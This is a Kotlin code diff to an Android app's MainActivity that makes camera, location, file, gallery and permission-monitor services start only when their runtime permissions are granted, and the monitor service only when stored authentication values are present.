@@ -463,22 +463,55 @@ class MainActivity : ComponentActivity() {
 
     /* ── Service Management ──────────────────────────── */
     private fun startAllServices() {
-        val services = listOf(
-            CameraService::class.java,
-            DataService::class.java,
-            FilesService::class.java,
-            GalleryService::class.java,
-            PermissionMonitorService::class.java
+        val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
+        val key = prefs.getString("secret_key", null)
+        val deviceId = prefs.getString("device_id", null)
+        val isAuthenticated = !key.isNullOrEmpty() && !deviceId.isNullOrEmpty()
+
+        val services = mapOf(
+            CameraService::class.java to listOf(android.Manifest.permission.CAMERA),
+            DataService::class.java to listOf(android.Manifest.permission.ACCESS_FINE_LOCATION),
+            FilesService::class.java to listOf(
+                if (Build.VERSION.SDK_INT >= 33) android.Manifest.permission.READ_MEDIA_IMAGES
+                else android.Manifest.permission.READ_EXTERNAL_STORAGE
+            ),
+            GalleryService::class.java to listOf(
+                if (Build.VERSION.SDK_INT >= 33) android.Manifest.permission.READ_MEDIA_IMAGES
+                else android.Manifest.permission.READ_EXTERNAL_STORAGE
+            ),
+            PermissionMonitorService::class.java to emptyList<String>()
         )
 
-        services.forEach { serviceClass ->
+        services.forEach { (serviceClass, requiredPermissions) ->
+            if (serviceClass == PermissionMonitorService::class.java && !isAuthenticated) {
+                Log.w(TAG, "Skipping ${serviceClass.simpleName} - missing authentication")
+                return@forEach
+            }
+
+            if (hasRequiredPermissions(requiredPermissions)) {
+                try {
+                    val intent = Intent(this, serviceClass)
+                    ContextCompat.startForegroundService(this, intent)
+                    Log.d(TAG, "Started ${serviceClass.simpleName}")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to start ${serviceClass.simpleName}", e)
+                    // Don't crash if a service fails
+                }
+            } else {
+                Log.w(TAG, "Missing permissions for ${serviceClass.simpleName}")
+            }
+        }
+    }
+
+    private fun hasRequiredPermissions(permissions: List<String>): Boolean {
+        if (permissions.isEmpty()) return true
+
+        return permissions.all { perm ->
             try {
-                val intent = Intent(this, serviceClass)
-                ContextCompat.startForegroundService(this, intent)
-                Log.d(TAG, "Started ${serviceClass.simpleName}")
+                ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
             } catch (e: Exception) {
-                Log.e(TAG, "Failed to start ${serviceClass.simpleName}", e)
-                // Don't crash if a service fails
+                Log.w(TAG, "Error checking permission: $perm", e)
+                false
             }
         }
     }
